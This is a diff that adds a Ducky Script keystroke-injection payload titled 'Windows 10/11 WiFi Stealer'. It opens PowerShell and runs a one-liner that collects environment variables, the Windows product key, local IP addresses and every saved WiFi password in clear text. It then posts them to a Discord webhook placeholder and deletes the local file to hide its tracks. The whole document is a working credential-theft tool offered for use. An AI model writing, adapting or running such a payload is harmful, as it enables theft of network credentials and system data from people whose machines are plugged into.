@@ -1,0 +1,10 @@
+REM Title: Windows 10/11 WiFi Stealer
+REM Author: Spade
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 1000
+STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $key=$((Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey);$url="[DISCORD WEBHOOK URL]"; dir env: >> "$env:computername.txt"; $((Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey) >> "$env:computername.txt"; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> "$env:computername.txt";$Body=[PSCustomObject]@{ content = "$env:computername's WiFi details Exfil | Win License Key: $key"};Invoke-RestMethod -ContentType 'application/json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@$env:computername.txt" $url ; Remove-Item ".\$env:computername.txt"; exit
+ENTER
